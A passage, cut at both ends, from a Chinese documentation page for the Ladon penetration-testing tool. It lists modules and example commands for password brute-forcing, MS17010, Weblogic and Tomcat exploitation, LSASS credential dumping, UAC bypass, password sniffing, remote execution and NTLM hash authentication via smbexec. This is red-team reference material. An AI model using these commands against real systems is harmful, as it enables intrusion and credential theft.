href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%80%9D%E7%A7%91%E8%AE%BE%E5%A4%87%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">CiscoScan</a></td><td>思科设备扫描</td><td>存活IP、设备型号、主机名、Boot、硬件版本</td></tr><tr><td>5</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E5%86%85%E7%BD%91MSSQL%E4%B8%BB%E6%9C%BA" target="_blank" rel="noopener">EnumMssql</a></td><td>枚举Mssql数据库主机</td><td>数据库IP、机器名、SQL版本</td></tr><tr><td>6</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E8%B5%84%E6%BA%90" target="_blank" rel="noopener">EnumShare</a></td><td>枚举网络共享资源</td><td>域、存活IP、共享路径</td></tr><tr><td>7</td><td><a href="http://k8gege.org/p/39070.html">LdapScan</a></td><td>不指定密码时，仅探测LDAP服务器</td><td>IP是否LDAP服务器</td></tr><tr><td>8</td><td><a href="http://k8gege.org/p/39070.html">FtpScan</a></td><td>不指定密码时，仅探测FTP服务器</td><td>IP是否FTP服务器</td></tr></tbody></table><h4 id="0x003-口令检测-密码爆破-16"><a href="#0x003-口令检测-密码爆破-16" class="headerlink" title="0x003 口令检测/密码爆破(16)"></a>0x003 口令检测/密码爆破(16)</h4><p>[自定义端口(IP:端口)、帐密检测(用户 密码)、主机帐密检测(IP 端口 数据库 用户 密码)]</p><p>例子: Ladon SshScan<br>例子: Ladon 192.168.1.8/24 SshScan<br>例子: Ladon 192.168.1.8:22 SshScan (指定端口)<br>例子: Ladon test.rar RarScan</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>返回结果</th><th>依赖</th></tr></thead><tbody><tr><td>1</td><td><a href="http://k8gege.org/Ladon/SmbScan.html">SmbScan</a></td><td>SMB密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>2</td><td><a href="http://k8gege.org/Ladon/WmiScan.html">WmiScan</a></td><td>Wmi密码爆破(Windowns)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>3</td><td><a href="http://k8gege.org/Ladon/NbtScan.html">NbtScan</a></td><td>Ipc密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>4</td><td><a href="http://k8gege.org/p/56393.html">LdapScan</a></td><td>AD域密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>5</td><td><a href="http://k8gege.org/Ladon/SmbHashScan.html">SmbHashScan</a></td><td>SMB HASH密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>6</td><td><a href="http://k8gege.org/Ladon/WmiHashScan.html">WmiHashScan</a></td><td>WMI HASH密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>7</td><td><a href="http://k8gege.org/Ladon/sshscan.html">SshScan</a></td><td>SSH密码爆破(Linux)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>8</td><td><a href="http://k8gege.org/Ladon/MssqlScan.html">MssqlScan</a></td><td>Mssql数据库密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>9</td><td><a href="http://k8gege.org/Ladon/OracleScan.html">OracleScan</a></td><td>Oracle数据库密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>10</td><td><a href="http://k8gege.org/Ladon/MysqlScan.html">MysqlScan</a></td><td>Mysql数据库密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>11</td><td><a href="http://k8gege.org/Ladon/weblogicScan.html">WeblogicScan</a></td><td>Weblogic后台密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>12</td><td><a href="http://k8gege.org/Ladon/VncScan.html">VncScan</a></td><td>VNC远程桌面密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>13</td><td><a href="http://k8gege.org/Ladon/ftpscan.html">FtpScan</a></td><td>Ftp服务器密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>14</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Rar%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3" target="_blank" rel="noopener">RarScan</a></td><td>Rar压缩包密码爆破</td><td>检测过程、成功密码、LOG文件</td><td>Rar.exe</td></tr><tr><td>15</td><td><a href="http://k8gege.org/Ladon/TomcatScan.html">TomcatScan</a></td><td>Tomcat后台登陆密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>16</td><td><a href="http://k8gege.org/Ladon/HttpbasicScan.html">HttpBasicScan</a></td><td>HttpBasic401认证密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>17</td><td><a href="http://k8gege.org/Ladon/WinrmScan.html">WinrmScan</a></td><td>Winrm认证密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr></tbody></table><h4 id="0x004-漏洞检测-漏洞利用-9"><a href="#0x004-漏洞检测-漏洞利用-9" class="headerlink" title="0x004 漏洞检测/漏洞利用(9)"></a>0x004 漏洞检测/漏洞利用(9)</h4><p>例子: Ladon MS17010<br>例子: Ladon 192.168.1.8/24 MS17010<br>例子: Ladon <a href="http://192.168.1.8" target="_blank" rel="noopener">http://192.168.1.8</a> WeblogicExp</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-MS17010%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">MS17010</a></td><td>SMB漏洞检测(CVE-2017-0143/CVE-2017-0144/CVE-2017-0145/CVE-2017-0146/CVE-2017-0148)</td></tr><tr><td>2</td><td><a href="http://k8gege.org/Ladon/example.html">SMBGhost</a></td><td>SMBGhost远程溢出漏洞检测 （CVE-2020-0796）</td></tr></tbody></table><p>3 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit" target="_blank" rel="noopener">WeblogicPoc</a> | Weblogic漏洞检测(CVE-2019-2725/<a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">CVE-2018-2894</a>)<br>4 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">PhpStudyPoc</a> |  PhpStudy后门检测(phpstudy 2016/phpstudy 2018)<br>5 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F--CVE-2016-3088" target="_blank" rel="noopener">ActivemqPoc</a> |  ActiveMQ漏洞检测(CVE-2016-3088)<br>6 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2017-12615" target="_blank" rel="noopener">TomcatPoc</a>  | Tomcat漏洞检测(CVE-2017-12615)<br>7 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit" target="_blank" rel="noopener">WeblogicExp</a> | Weblogic漏洞利用(CVE-2019-2725)<br>8 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2017-12615" target="_blank" rel="noopener">TomcatExp</a>  | Tomcat漏洞利用(CVE-2017-12615)<br>9 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-Struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">Struts2Poc</a> | Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)</p><h4 id="0x005-加密解密-4"><a href="#0x005-加密解密-4" class="headerlink" title="0x005 加密解密(4)"></a>0x005 加密解密(4)</h4><p>例子: Ladon 字符串 EnHex<br>例子: Ladon EnHex (批量str.txt)</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">EnHex</a></td><td>批量Hex密码加密</td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">DeHex</a></td><td>批量Hex密码解密</td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">EnBase64</a></td><td>批量Base64密码加密</td></tr><tr><td>4</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">DeBase64</a></td><td>批量Base64密码解密</td></tr></tbody></table><h4 id="0x006-下载功能-2"><a href="#0x006-下载功能-2" class="headerlink" title="0x006 下载功能(2)"></a>0x006 下载功能(2)</h4><p>下载功能主要用于内网文件传输或者将VPS文件下载至目标机器</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>HttpDownLoad</td><td>HTTP下载</td><td>Ladon HttpDownLoad <a href="http://k8gege.org/test.exe">http://k8gege.org/test.exe</a></td></tr><tr><td>2</td><td>FtpDownLoad</td><td>Ftp下载</td><td>Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe</td></tr></tbody></table><h4 id="0x007-网络嗅探-3"><a href="#0x007-网络嗅探-3" class="headerlink" title="0x007 网络嗅探(3)"></a>0x007 网络嗅探(3)</h4><p>基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br>主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br>后续可能会添加其它功能可能另外写个专门用于嗅探的工具<br>PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br>重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br>当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>FtpSniffer/SnifferFtp</td><td>Ftp密码嗅探</td><td>Ladon FtpSniffer 192.168.1.5</td></tr><tr><td>2</td><td>HttpSniffer/SnifferHTTP</td><td>HTTP密码嗅探</td><td>Ladon HTTPSniffer 192.168.1.5</td></tr><tr><td>3</td><td>Sniffer</td><td>网络嗅探(源地址、目标地址)</td><td>Ladon Sniffer</td></tr></tbody></table><h4 id="0x008-密码读取-2"><a href="#0x008-密码读取-2" class="headerlink" title="0x008 密码读取(2)"></a>0x008 密码读取(2)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>EnumIIS/IisWeb</td><td>IIS站点密码读取</td><td>Ladon EnumIIS 或 Ladon IisWeb</td></tr><tr><td>2</td><td><a href="http://k8gege.org/p/55476.html">DumpLsass </a></td><td>DumpLsass内存密码</td><td>Ladon DumpLsass</td></tr></tbody></table><h4 id="0x009-信息收集-3"><a href="#0x009-信息收集-3" class="headerlink" title="0x009 信息收集(3)"></a>0x009 信息收集(3)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>EnumProcess/ProcessList/tasklist</td><td>进程详细信息</td><td>Ladon EnumProcess 或 Ladon Tasklist</td></tr><tr><td>2</td><td>GetCmdLine/CmdLine</td><td>获取命令行参数</td><td>Ladon cmdline 或 Ladon cmdline cmd.exe</td></tr><tr><td>3</td><td>GetInfo/GetInfo2</td><td>获取渗透基础信息</td><td>Ladon GetInfo 或 Ladon GetInfo2</td></tr></tbody></table><h4 id="0x010-远程执行-6"><a href="#0x010-远程执行-6" class="headerlink" title="0x010 远程执行(6)"></a>0x010 远程执行(6)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td><a href="http://k8gege.org/Ladon/WinShell.html">WmiExec</a></td><td>135端口执行命令</td><td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td></tr><tr><td>2</td><td><a href="http://k8gege.org/Ladon/WinShell.html">PsExec</a></td><td>445端口执行命令</td><td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td></tr><tr><td>3</td><td><a href="http://k8gege.org/Ladon/WinShell.html">AtExec</a></td><td>445端口执行命令</td><td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td></tr><tr><td>4</td><td><a href="http://k8gege.org/Ladon/WinShell.html">SshExec</a></td><td>22端口执行命令</td><td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td></tr><tr><td>5</td><td><a href="http://k8gege.org/p/ladon_cs_shell.html">JspShell</a></td><td>Jsp一句话执行命令</td><td><a href="http://k8gege.org/p/ladon_cs_shell.html">http://k8gege.org/p/ladon_cs_shell.html</a></td></tr><tr><td>6</td><td><a href="http://k8gege.org/Ladon/webshell.html">WebShell</a></td><td>WebShell执行命令</td><td><a href="http://k8gege.org/Ladon/webshell.html">http://k8gege.org/Ladon/webshell.html</a></td></tr></tbody></table><h4 id="0x011-提权降权-3"><a href="#0x011-提权降权-3" class="headerlink" title="0x011 提权降权(3)"></a>0x011 提权降权(3)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td><a href="http://k8gege.org/p/39070.html">BypassUac</a></td><td>绕过UAC执行,支持Win7-Win10</td><td>Ladon BypassUac c:\1.exe 或 Ladon BypassUac c:\1.bat</td></tr><tr><td>2</td><td><a href="http://k8gege.org/p/55476.html">GetSystem</a></td><td>提权或降权运行程序</td><td>Ladon GetSystem cmd.exe 或 Ladon GetSystem cmd.exe explorer</td></tr><tr><td>3</td><td>Runas</td><td>模拟用户执行命令</td><td>Ladon Runas user pass cmd</td></tr></tbody></table><h4 id="0x012-其它功能-6"><a href="#0x012-其它功能-6" class="headerlink" title="0x012 其它功能(6)"></a>0x012 其它功能(6)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td><a href="http://k8gege.org/p/39070.html">EnableDotNet</a></td><td>一键启用.net 3.5(2008系统默认未启用)</td><td>Ladon EnableDotNet</td></tr><tr><td>2</td><td><a href="http://k8gege.org/p/39070.html">gethtml</a></td><td>获取内网站点HTML源码</td><td>Ladon gethtml <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a></td></tr><tr><td>3</td><td><a href="http://k8gege.org/p/55476.html">CheckDoor</a></td><td>检测后门(网上公开多年的)</td><td>Ladon CheckDoor 或 Ladon AutoRun</td></tr><tr><td>4</td><td><a href="http://k8gege.org/">GetIP</a></td><td>获取本机内网IP与外网IP</td><td>Ladon GetIP</td></tr><tr><td>5</td><td><a href="http://k8gege.org/">WebSer</a></td><td>迷你WEB服务器</td><td>Ladon WebSer 80 或 Ladon web 80</td></tr><tr><td>6</td><td><a href="http://k8gege.org/">NetVer</a></td><td>查看安装.NET版本</td><td>Ladon NetVer 或 Ladon NetVersion</td></tr><tr><td>6</td><td><a href="http://k8gege.org/">PsVer</a></td><td>查看PowerShell版本</td><td>Ladon PsVer 或 Ladon PSVersion</td></tr></tbody></table><p>注：以上仅是该工具内置模块的初级用法，外置插件或更高级用法请查看使用文档<br> 中级用法INI文件配置调用任意程序、系统命令、各种语言现成EXP的批量利用<br> 高级用法Exp生成器一键生成Poc，使用各种语言编写插件扩展Ladon扫描能力。</p><h3 id="外部插件模块-17"><a href="#外部插件模块-17" class="headerlink" title="外部插件模块(17)"></a>外部插件模块(17)</h3><table><thead><tr><th>ID</th><th>功能</th><th>实现语言</th><th>功能说明</th></tr></thead><tbody><tr><td>1</td><td>漏洞扫描</td><td>C语言</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-0708-Windows-Rdp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" target="_blank" rel="noopener">CVE 2019-0708 Windows Rdp 3389漏洞批量检测</a></td></tr><tr><td>2</td><td>漏洞利用</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-ThinkPHP-5.0.22-5.1.29-RCE-GetShell-Exploit" target="_blank" rel="noopener">ThinkPHP 5.0.22 5.1.29 RCE GetShell Exploit</a></td></tr><tr><td>3</td><td>漏洞利用</td><td>Python</td><td><a href="https://github.com/k8gege/ZimbraExploit" target="_blank" rel="noopener">CVE-2019-9621 Zimbra GetShell Exploit</a></td></tr><tr><td>4</td><td>漏洞利用</td><td>Python</td><td><a href="https://github.com/k8gege/CVE-2019-0604" target="_blank" rel="noopener">CVE-2019-0604 SharePoint GetShell Exploit</a></td></tr><tr><td>5</td><td>漏洞利用</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2016-3088-ActiveMQ-GetShell-Exploit" target="_blank" rel="noopener">CVE 2016-3088 ActiveMQ GetShell Exploit</a></td></tr><tr><td>6</td><td>漏洞利用</td><td>Python</td><td><a href="https://github.com/k8gege/SolrExp" target="_blank" rel="noopener">Apache Solr 8.2.0 Velocity RCE 0day Exploit</a></td></tr><tr><td>7</td><td>漏洞利用</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8" target="_blank" rel="noopener">PhpStudy后门 GetShell Exploit</a></td></tr><tr><td>8</td><td>命令执行</td><td>INI配置</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FSSH%E4%B8%8A%E6%8E%A7" target="_blank" rel="noopener">INI调用外部程序命令批量Linux上控</a></td></tr><tr><td>9</td><td>命令执行</td><td>INI配置</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FWin%E4%B8%8A%E6%8E%A7" target="_blank" rel="noopener">INI调用外部程序命令批量Windowns上控</a></td></tr><tr><td>10</td><td>漏洞扫描</td><td>Python</td><td><a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">PHP-FPM 远程代码执行漏洞(CVE-2019-11043)</a></td></tr><tr><td>11</td><td>漏洞扫描</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">Weblogic CVE-2018-2894漏洞检测</a></td></tr><tr><td>12</td><td>漏洞利用</td><td>PowerShell</td><td><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">MS17010EXP 永恒之蓝漏洞利用</a></td></tr><tr><td>13</td><td>脚本调用</td><td>PowerShell</td><td><a href="http://k8gege.org/p/32e1a912.html">Kali 2019无PowerShell执行脚本</a></td></tr><tr><td>14</td><td>口令扫描</td><td>INI配置</td><td><a href="http://k8gege.org/p/55476.html">ipcscan.ini INI插件之Ipc密码爆破</a></td></tr><tr><td>15</td><td>口令扫描</td><td>INI配置</td><td><a href="http://k8gege.org/p/55476.html">smbscan.ini INI插件之Smb密码爆破</a></td></tr><tr><td>16</td><td>口令扫描</td><td>INI配置</td><td><a href="http://k8gege.org/p/55476.html">smbhash.ini INI插件之NtlmHash爆破</a></td></tr><tr><td>17</td><td>口令扫描</td><td>INI配置</td><td><a href="http://k8gege.org/Ladon/WinrmScan.html">winrmscan.ini INI插件之Winrm密码爆破</a></td></tr></tbody></table><p>文档参考Cscan: <a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></p><h3 id="中级用法"><a href="#中级用法" class="headerlink" title="中级用法"></a>中级用法</h3><h3 id="批量扫描"><a href="#批量扫描" class="headerlink" title="批量扫描"></a>批量扫描</h3><p>0x001 参数 ip/24 ip/16 ip/8<br>命令: Ladon 192.168.1.8/24 OnlinePC</p><p>0x002 文件 ip.txt ip24.txt ip16.txt url.txt host.txt domain.txt str.txt<br>程序根目录下创建对应文件即可,如批量扫描多个ip使用ip.txt,批量扫多个C段使用ip24.txt<br>无需指定txt程序会自动加载文件进行扫描,如扫描存活主机只需命令: Ladon OnlinePC</p><h3 id="禁ping扫描"><a href="#禁ping扫描" class="headerlink" title="禁ping扫描"></a>禁ping扫描</h3><p>默认扫描会先通过icmp扫描主机是否存活，当使用工具转发内网<br>或者目标机器禁ping时,使用noping参数进行扫描,速度稍慢一点<br>Ladon noping<br>Ladon noping 192.168.1.8/24<br>Ladon noping 192.168.1.8/24 MS17010</p><h3 id="Socks5代理扫描"><a href="#Socks5代理扫描" class="headerlink" title="Socks5代理扫描"></a>Socks5代理扫描</h3><p>详见：<a href="http://k8gege.org/Ladon/proxy.html">http://k8gege.org/Ladon/proxy.html</a></p><h4 id="linux-macos下KaliLadon"><a href="#linux-macos下KaliLadon" class="headerlink" title="linux/macos下KaliLadon"></a>linux/macos下KaliLadon</h4><p>proxychains mono Ladon noping 192.168.1.8/24 MS17010<br>proxychains mono Ladon noping <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a> WhatCMS</p><h4 id="windows下Ladon-exe"><a href="#windows下Ladon-exe" class="headerlink" title="windows下Ladon.exe"></a>windows下Ladon.exe</h4><p>推荐proxifier 3.42及以上版本，最好是最新版4.0.1<br>例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）<br>Ladon noping 10.1.2.8/24 MS17010</p><h3 id="配置INI调用任意程序、密码爆破"><a href="#配置INI调用任意程序、密码爆破" class="headerlink" title="配置INI调用任意程序、密码爆破"></a>配置INI调用任意程序、密码爆破</h3><p>适用场景，需调用相关命令或第三方工具进行批量操作<br>或者有新的POC，但来不及或无法写成DLL来调用时<br>很多第3方工具不支持批量或者说根本不支持批量网段<br>而Ladon不只限于批量IP、URL、IP段、任意内容等<br>是紧急情况下最适合用于验证内网是否存在漏洞工具<br>新的漏洞来时你能调好POC就不错了，批量更要时间</p><h4 id="调用系统ping命令进行存活主机探测"><a href="#调用系统ping命令进行存活主机探测" class="headerlink" title="调用系统ping命令进行存活主机探测"></a>调用系统ping命令进行存活主机探测</h4><p>ping.ini<br>[Ladon]<br>exe=cmd.exe<br>arg=/c ping $ip$</p><p>命令:  Ladon ping.ini<br>命令:  Ladon 192.168.1.8/24 ping.ini</p><h4 id="调用Python-poc批量检测漏洞"><a href="#调用Python-poc批量检测漏洞" class="headerlink" title="调用Python poc批量检测漏洞"></a>调用Python poc批量检测漏洞</h4><p>[Ladon]<br>exe=F:\Python279\python.exe<br>arg=CVE-2019-11043-POC.py $ip$</p><p>例子: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a></p><h4 id="自定义程序密码爆破"><a href="#自定义程序密码爆破" class="headerlink" title="自定义程序密码爆破"></a>自定义程序密码爆破</h4><p>例子：调用修改过的smbexec.exe进行HASH密码验证，原版不退出无法爆破<br>根目录下放4个文件，smbexec.exe、smbhash.ini、user.txt、pass.txt。</p><p>smbhash.ini<br>[Ladon]<br>exe=smbexec.exe<br>arg=-hashes $pass$ $user$@$ip$<br>isok=Launching semi-interactive shell<br>port=445<br>log=true</p><p>INI参数说明<br>isok：成功标志，必填项。如smbexec成功时返回”Launching semi-interactive shell”<br>port：对应端口，非必填。如SMB为445，Ladon先检测到端口开放，才进行密码爆破<br>log:  程序日志，非必填。如有些程序返回一堆错误结果，我们不想看，可不显示</p><p>检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini<br>详见：<a href="http://localhost:4000/p/53177.html" target="_blank" rel="noopener">http://localhost:4000/p/53177.html</a></p><h3 id="配置端口扫描参数"><a href="#配置端口扫描参数" class="headerlink" title="配置端口扫描参数"></a>配置端口扫描参数</h3><h4 id="port-txt自定义端口"><a href="#port-txt自定义端口" class="headerlink" title="port.txt自定义端口"></a>port.txt自定义端口</h4><p>使用PortScan模块时，默认扫描常见高危漏洞端口<br>遇到修改了默认端口的，Ladon就无法扫描了吗？<br>使用port.txt<br>格式1:80,21,1433,3306,445<br>格式2:80-88,21-23,5800-5900<br>格式3:<br>21<br>23<br>80<br>格式4:<br>80-88<br>21-23</p><h4 id="命令行自定义端口"><a href="#命令行自定义端口" class="headerlink" title="命令行自定义端口"></a>命令行自定义端口</h4><p>Ladon 192.168.1.8/24 PortScan 80-89<br>Ladon 192.168.1.8-192.168.1.200 PortScan 22,80,1433,21,3306,1521</p><h3 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h3><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p><p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p><h4 id="数据库口令检测"><a href="#数据库口令检测" class="headerlink" title="数据库口令检测"></a>数据库口令检测</h4><p>数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行</p><h5 id="mssql密码验证"><a href="#mssql密码验证" class="headerlink" title="mssql密码验证"></a>mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>check.txt<br>192.168.1.8 1433 master sa k8gege<br>192.168.1.8 sa k8gege<br>192.168.1.8 1433 sa k8gege<br>命令: Ladon MssqlScan</p><h5 id="oracle同理"><a href="#oracle同理" class="headerlink" title="oracle同理"></a>oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OracleScan</p><h5 id="mysql无需指定数据库名"><a href="#mysql无需指定数据库名" class="headerlink" title="mysql无需指定数据库名"></a>mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MysqlScan</p><h5 id="系统密码"><a href="#系统密码" class="headerlink" title="系统密码"></a>系统密码</h5><h6 id="SSH密码爆破"><a href="#SSH密码爆破" class="headerlink" title="SSH密码爆破"></a>SSH密码爆破</h6><p>check.txt<br>192.168.1.8 22 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon SshScan</p><p>详细用法：<a href="http://k8gege.org/Ladon/sshscan.html">http://k8gege.org/Ladon/sshscan.html</a></p><h6 id="SMB-WMI密码爆破"><a href="#SMB-WMI密码爆破" class="headerlink" title="SMB/WMI密码爆破"></a>SMB/WMI密码爆破</h6><p>check.txt<br>192.168.1.8 admin k8gege<br>命令: Ladon WmiScan 或 Ladon SmbScan</p><h6 id="NTLM-HASH密码爆破"><a href="#NTLM-HASH密码爆破" class="headerlink" title="NTLM HASH密码爆破"></a>NTLM HASH密码爆破</h6><p>check.txt<br>192.168.1.8 admin k8gege<br>命令: Ladon WmiScan 或 Ladon SmbScan</p><h5 id="网站密码"><a href="#网站密码" class="headerlink" title="网站密码"></a>网站密码</h5><h6 id="weblogic密码爆破"><a href="#weblogic密码爆破" class="headerlink" title="weblogic密码爆破"></a>weblogic密码爆破</h6><p>check.txt(url 用户 密码)<br><a href="http://192.168.1.8:7001/console" target="_blank" rel="noopener">http://192.168.1.8:7001/console</a> weblogic k8gege<br>命令: Ladon WeblogicScan</p><h5 id="文件密码"><a href="#文件密码" class="headerlink" title="文件密码"></a>文件密码</h5><h6 id="RAR文件密码爆破"><a href="#RAR文件密码爆破" class="headerlink" 